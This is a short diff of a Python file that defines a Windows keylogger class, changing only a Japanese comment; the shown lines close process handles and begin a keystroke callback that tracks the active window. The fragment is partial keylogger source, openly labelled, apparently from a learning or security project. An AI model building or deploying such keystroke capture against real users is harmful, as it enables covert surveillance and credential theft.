@@ -39,7 +39,7 @@ class KeyLogger:
       windll.kernel32.CloseHandle(hwnd)
       windll.kernel32.CloseHandle(h_process)
 
-#ここまでで定数TIMEOUTを定義し、新しいクラスKeyLoggerを作成　その他処理<-書くのめんどい
+#ここまでで定数TIMEOUTを定義し、クラスKeyLoggerを作成　その他処理<-書くのめんどい
 
 def mykeystroke(self, event):
   if event.WindowName != self.current_window:
